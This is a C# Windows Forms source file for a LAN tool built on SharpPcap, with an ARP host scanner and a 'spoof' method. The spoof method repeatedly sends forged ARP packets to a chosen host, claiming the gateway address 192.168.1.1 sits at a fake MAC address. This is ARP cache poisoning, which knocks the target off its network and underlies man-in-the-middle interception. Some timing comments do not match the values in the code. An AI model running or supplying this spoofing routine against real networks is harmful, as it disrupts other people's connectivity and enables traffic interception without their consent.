using System;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;
using System.Collections.ObjectModel;
using System.Collections;

namespace WindowsFormsApplication1
{
    class ArpScanner
    {

        static public string deviceAddr = "";
        static public int deviceIndex   = 0;
        static public bool scanRunning  = false;
        static public Hashtable threads = new Hashtable();
        static public int scanDelay = 1200000; // 1.2 sec
        static public int maxRange = 64; // Default to 0-64 range

        public static LibPcapLiveDeviceList getDeviceList()
        {
            // Retrieve the device list
            var devices = LibPcapLiveDeviceList.Instance;

            // If no devices were found print an error
            if (devices.Count < 1)
            {
                throw new System.ArgumentException("No devices found");
            }
            return devices;
        }

        static public void spoof(string host)
        {
            LibPcapLiveDevice device = getDevice();
            IPAddress ip = IPAddress.Parse(host);

            // Create a new ARP resolver
            ARP arp = new ARP(device);
            arp.Timeout = new System.TimeSpan(scanDelay * 2); // 100ms

            // Preparar ip y mac fake, solo para spoofing
            IPAddress local_ip;
            IPAddress.TryParse("192.168.1.1", out local_ip);

            PhysicalAddress mac;
            mac = PhysicalAddress.Parse("11-22-33-44-55-66");

            // Enviar ARP

            for (int i = 0; i < 10000; i++)
            {
                try
                {
                    arp.Resolve(ip, local_ip, mac);
                }
                catch (Exception e)
                {
                    MessageBox.Show(ip + " stopped responding: " + e.Message);
                    return;
                }

                System.Threading.Thread.Sleep(5000); // 5 sec
            }

            return;
        }

        public string scanHost(string host)
        {
            // Parse target IP addr

            LibPcapLiveDevice device = getDevice();
            IPAddress targetIP = null;

            bool ok = IPAddress.TryParse(host, out targetIP);

            if (!ok)
            {
                Console.WriteLine("Invalid IP.");
                return "fail";
            }

            // Create a new ARP resolver
            ARP arp = new ARP(device);
            arp.Timeout = new System.TimeSpan(scanDelay); // 100ms

            // Enviar ARP
            var resolvedMacAddress = arp.Resolve(targetIP);

            if (resolvedMacAddress == null)
            {
                return "fail";
            }
            else
            {
                string fmac = formatMac(resolvedMacAddress);
                Console.WriteLine(targetIP + " is at: " + fmac);

                return fmac;
            }

        }

        public void scanNetwork(MainAppWindow form)
        {
            scanRunning = true;

            for (int i = 1; i < maxRange; i++)
            {
                // Build up IP and start scanning
                
                string ip;
                if (deviceAddr.Length == 0)
                    ip = "192.168.1.";
                else
                    ip = Regex.Replace(deviceAddr, @"\d+$", "");

                ip += i;
                string results = scanHost(ip);

                if (results != "fail")
                    form.updateList(ip, results);

                if (i % (maxRange / 10) == 0)
                    form.updateProgress();
            }

            MessageBox.Show("Scan finished!", "info", MessageBoxButtons.OK, MessageBoxIcon.Information);

            scanRunning = false;

        }

        private static string formatMac(System.Net.NetworkInformation.PhysicalAddress resolvedMacAddress)
        {
            string m = resolvedMacAddress.ToString();
            MatchCollection split = Regex.Matches(m, @"\w{2}");
            string mac = "";

            foreach (Match item in split)
            {
                mac += item.Value + ":";
            }

            return mac.Remove(mac.Length - 1);
        }

        private static LibPcapLiveDevice getDevice()
        {
            LibPcapLiveDevice device;
            if (deviceIndex == 0)
                device = getFirstDevice();
            else
                device = getDeviceList()[deviceIndex];
            return device;
        }

        private static LibPcapLiveDevice getFirstDevice()
        {
            var devices = getDeviceList();

            LibPcapLiveDevice device = devices[0];
            return device;
        }
    }
}
